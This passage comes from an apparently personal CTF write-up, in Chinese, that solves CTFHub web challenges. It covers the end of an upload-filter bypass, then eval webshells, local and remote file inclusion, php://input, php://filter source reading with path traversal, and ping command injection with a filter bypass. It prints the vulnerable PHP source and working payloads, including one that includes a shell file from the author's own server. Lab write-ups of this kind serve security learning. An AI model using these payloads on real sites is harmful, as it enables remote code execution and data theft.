class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="hljs-variable">$name</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . UPLOAD_URL_PATH . <span class="hljs-variable">$name</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;CTFHub 文件上传——双写绕过&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;CTFHub 文件上传——双写绕过&lt;/h1&gt;<br>    &lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;<br>        &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>        &lt;br /&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;<br>    &lt;/form&gt;<br>    &lt;p&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;!--<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$name</span>);<br>--&gt;<br></code></pre></td></tr></table></figure><h2 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h2><h3 id="eval执行"><a class="markdownIt-Anchor" href="#eval执行"></a> eval执行</h3><p>题目如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我看了一眼，这不就是php一句话木马嘛2333。直接蚁剑连接了，很快得到了flag。</p><p><img src="https://upyun.wuuconix.link/image-20210903115843283.png" alt="antsword flag" /></p><p>然后我局的的还是得手动输入命令来得到flag。我是这样试的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/index.php?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>但是页面一片空白2333。</p><p>后来我才意识到，php中的<code>eval</code>函数是用来执行php里的函数的，相当于把一个字符串运行。但是这个ls可不是php里的函数，需要利用<code>system</code>函数来调用linux系统命令。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?cmd=<span class="hljs-keyword">system</span>(&quot;ls&quot;)<br></code></pre></td></tr></table></figure><p>结果还是不行。我再次陷入了人生和社会的大思考。</p><p>看了官方wp之后才知道eval里面的字符串需要满足一个完整的php语句的要求。即<code>;</code>结尾。</p><p>忘记分号这件事实际上一直在发生，在php交互式终端如果你不输分号的话是不会有任何结果的。</p><p><img src="https://upyun.wuuconix.link/image-20210903121548796.png" alt="echo 1" /></p><p>只有输入分号，作为一条完整的php语句的时候才有结果。</p><p><img src="https://upyun.wuuconix.link/image-20210903121626332.png" alt="echo 1;" /></p><p>同理eval里面的语句也必须要有分号。你不输分号它甚至会报错2333。</p><p><img src="https://upyun.wuuconix.link/image-20210903121741001.png" alt="eval" /></p><p>接下来就简单啦。</p><p><img src="https://upyun.wuuconix.link/image-20210903121419176.png" alt="ls /" /></p><p><img src="https://upyun.wuuconix.link/image-20210903121434027.png" alt="cat /flag" /></p><h3 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h3><p>这道题也十分简单。主要的考点是<code>include</code>。在php中利用该函数可以将其他文件引入当前php文件。</p><p>我之前以为引入的文件只能是php文件，现在看来根本没有这种限制，只要你被引入的文件里有php语句就能正常发挥作用，具体的文件后缀是没有影响的。</p><p>比如下面的例子 ，我引入了一个<code>test.txt</code>也能够正常的发挥作用。</p><p><img src="https://upyun.wuuconix.link/image-20210903125119391.png" alt="test.txt" /></p><p><img src="https://upyun.wuuconix.link/image-20210903125149707.png" alt="phpinfo" /></p><p>那我们再来看看这道题。</p><p><img src="https://upyun.wuuconix.link/image-20210903125244675.png" alt="题目1" /></p><p><img src="https://upyun.wuuconix.link/image-20210903125258220.png" alt="题目2" /></p><p>它提供了一个木马txt文件，同时还提供了file参数来引入文件，很显然我们只要这样就能样<code>index.php</code>变成一句话木马。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">index</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">shell</span>.txt<br></code></pre></td></tr></table></figure><p>我本来以为蚁剑这样是连不上的，结果强大的蚁剑迅速理解了意思，成功连接。</p><p><img src="https://upyun.wuuconix.link/image-20210903125442117.png" alt="antsword" /></p><p>那如何手动get flag呢？只需要继续添加ctfhub参数即可。</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=shell.txt<span class="hljs-variable">&amp;ctfhub</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br></code></pre></td></tr></table></figure><p>直接在浏览器输入以上payload即可，至于那个空格 浏览器会自动进行url编码，成为<code>%20</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210903125540553.png" alt="手动ctf" /></p><p>偷源码233</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i have a &lt;a href=<span class="hljs-string">&quot;shell.txt&quot;</span>&gt;shell&lt;/a&gt;, how to <span class="hljs-keyword">use</span> <span class="hljs-title">it</span> ?<br></code></pre></td></tr></table></figure><h3 id="phpinput"><a class="markdownIt-Anchor" href="#phpinput"></a> php://input</h3><p>题目提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) === <span class="hljs-string">&quot;php://&quot;</span> ) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i don<span class="hljs-string">&#x27;t have shell, how to get flag? &lt;br&gt;</span><br><span class="hljs-string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></code></pre></td></tr></table></figure><p>题目题目我们给file变量传一个<code>php://input</code>。</p><p><code>php://input</code>生效的条件为：</p><blockquote><p>在php.ini中的<code>allow_url_fopen</code>和<code>allow_url_include</code>全部开启。</p></blockquote><p>这个<code>php://input</code>支持post方式传输的数据流的输入。我们可以用post方式传值。</p><p>因为源代码把我们输入的代码<code>include</code>的了，相当于我们写的php代码将直接在题目中发挥作用。</p><p>我么这里直接写一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>来看一看根目录下的文件们。</p><p><img src="https://upyun.wuuconix.link/image-20210904223648891.png" alt="post 传值" /></p><p>很顺利的找到了flag。cat即可。</p><p><img src="https://upyun.wuuconix.link/image-20210904223937452.png" alt="ctf" /></p><p>再把源码偷下来233。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) === <span class="hljs-string">&quot;php://&quot;</span> ) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i don<span class="hljs-string">&#x27;t have shell, how to get flag? &lt;br&gt;</span><br><span class="hljs-string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></code></pre></td></tr></table></figure><h3 id="远程包含"><a class="markdownIt-Anchor" href="#远程包含"></a> 远程包含</h3><p>php 的include在以下条件下可以引入一个url文件。</p><blockquote><p>在php.ini中的<code>allow_url_fopen</code>和<code>allow_url_include</code>全部开启。</p></blockquote><p>观察题目给出的phpinfo</p><p><img src="https://upyun.wuuconix.link/image-20210904225423629.png" alt="allow_url_include" /></p><p>符合条件。</p><p>于是我在我的阿里云服务器上开了一个服务。</p><p><img src="https://upyun.wuuconix.link/image-20210904225542852.png" alt="远程shell.txt" /></p><p>然后把这个url include就可以了。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-<span class="hljs-number">085</span>d74ac724ca4c9.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?file=https:/</span><span class="hljs-regexp">/emu.wuuconix.link/</span>shell.txt<br></code></pre></td></tr></table></figure><p>然后就可以连接蚁剑啦！</p><p><img src="https://upyun.wuuconix.link/image-20210904225651405.png" alt="antsword" /></p><p>同时我们可以发现url include一个文件和<code>php://input</code>生效的条件是一模一样的。所以在没有手动限制的情况下， 这其中一个可用，就说明另一个也可用。所以我们在这道题里同样可以使用上一道题<code>php://input</code>的做法。</p><p>生效条件一样也非常好理解。<code>php://input</code>能够支持用户post传的值，这对于服务器本身而言，就是外界url的文本嘛2333，相当于引入了一个url文件。故两者生效条件一致。</p><p><img src="https://upyun.wuuconix.link/image-20210904225912708.png" alt="input" /></p><p>题目源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i don<span class="hljs-string">&#x27;t have shell, how to get flag?&lt;br&gt;</span><br><span class="hljs-string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></code></pre></td></tr></table></figure><h3 id="读取源代码"><a class="markdownIt-Anchor" href="#读取源代码"></a> 读取源代码</h3><p>页面提示flag在<code>/flag</code>里。</p><p><code>php://input</code>失效了。</p><p>作者应该是在<code>php.ini</code>中关掉了<code>allow_url_fopen</code>和<code>allow_url_include</code>中的一个获得都关了233。</p><p><code>php://input</code>从本质上讲是从外界url中获取文本，所以需要这两个开关保持开启。</p><p>但是<code>php://filter</code>作用的对象是本地【一般我们用来都index.php嘛2333】，不需要开启这两个就可以生效。</p><p>遂用<code>php://filter/read=convert.base64-encode/resource=</code>来直接读取flag的内容。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-<span class="hljs-number">07841</span>d369bc23ed5.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/index.php?file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode<span class="hljs-regexp">/resource=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p>得到</p><p><img src="https://upyun.wuuconix.link/image-20210904231248214.png" alt="得到base64加密后的flag" /></p><p>解码后得到flag。</p><p><img src="https://upyun.wuuconix.link/image-20210904231305923.png" alt="base64解码" /></p><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) === <span class="hljs-string">&quot;php://&quot;</span> ) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i don<span class="hljs-string">&#x27;t have shell, how to get flag? &lt;br&gt;</span><br><span class="hljs-string">flag in &lt;code&gt;/flag&lt;/code&gt;</span><br></code></pre></td></tr></table></figure><h3 id="命令注入"><a class="markdownIt-Anchor" href="#命令注入"></a> 命令注入</h3><p>很常见的命令联合执行的题。</p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$_GET[&#x27;ip&#x27;]&#125;</span>&quot;</span>;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;CTFHub 命令注入-无过滤&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;CTFHub 命令注入-无过滤&lt;/h1&gt;<br>&lt;form action=<span class="hljs-string">&quot;#&quot;</span> method=<span class="hljs-string">&quot;GET&quot;</span>&gt;<br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;ip&quot;</span>&gt;IP : &lt;/label&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> id=<span class="hljs-string">&quot;ip&quot;</span> name=<span class="hljs-string">&quot;ip&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Ping&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;hr&gt;<br>&lt;pre&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>) &#123;<br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$res</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/pre&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>在文本框中输入完ip之后利用分号分割再加入其他命令，最后的<code>$cmd</code>就会长成这样</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ping</span> -c <span class="hljs-number">4</span> <span class="hljs-number">127.0.0.1</span>;ls<br></code></pre></td></tr></table></figure><p>然后调用<code>exec</code>进行执行系统函数的时候就会把两句命令一起执行了。</p><p><img src="https://upyun.wuuconix.link/image-20210905224857275.png" alt=";ls" /></p><p><img src="https://upyun.wuuconix.link/image-20210905224959627.png" alt="ctf?" /></p><p>cat那个命令后没有出来flag，在源代码中。</p><p><img src="https://upyun.wuuconix.link/image-20210905225148057.png" alt="ctf" /></p><p>至于为什么不能直接在网页中看到大概是因为<code>&lt;?php</code>这种标签在html中的特定作用。</p><p>看了wp，了解到了可以这样，把文本进行一层base64加密，这样就能直接在网页里出来了。当然之后还需要手动解密。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span>; cat flag | base64<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210905231110531.png" alt="base64" /></p><h3 id="过滤cat"><a class="markdownIt-Anchor" href="#过滤cat"></a> 过滤cat</h3><p>部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/cat/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里注意一下php中的<code>preg_match_all</code>函数。它是用来匹配正则表达式的，并且将字符串中所有匹配的符合结果存在一个列表中。例子如下。</p><p><img src="https://upyun.wuuconix.link/image-20210907171134778.png" alt="preg_match_all" /></p><p>然后我们发现题目中过滤了cat。首先我们看看flag在哪。ls一下就出来了。</p><p><img src="https://upyun.wuuconix.link/image-20210907171235141.png" alt="flag" /></p><p>很久以前我看到的一个命令，就是<code>tac</code>。很显然这个命令就是<code>cat</code>反过来的单词。它的实际效果也和它的名字一致。貌似就是把文本的最后一行先打印，从下往上打印。效果如下。</p><p><img src="https://upyun.wuuconix.link/image-20210907171504435.png" alt="tac" /></p><p>所以这里我们直接用tac来读flag就行啦2333。</p><p><img src="https://upyun.wuuconix.link/image-20210907171546867.png" alt="ctf" /></p><h3 id="过滤空格-2"><a class="markdownIt-Anchor" href="#过滤空格-2"></a> 过滤空格</h3><p>部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 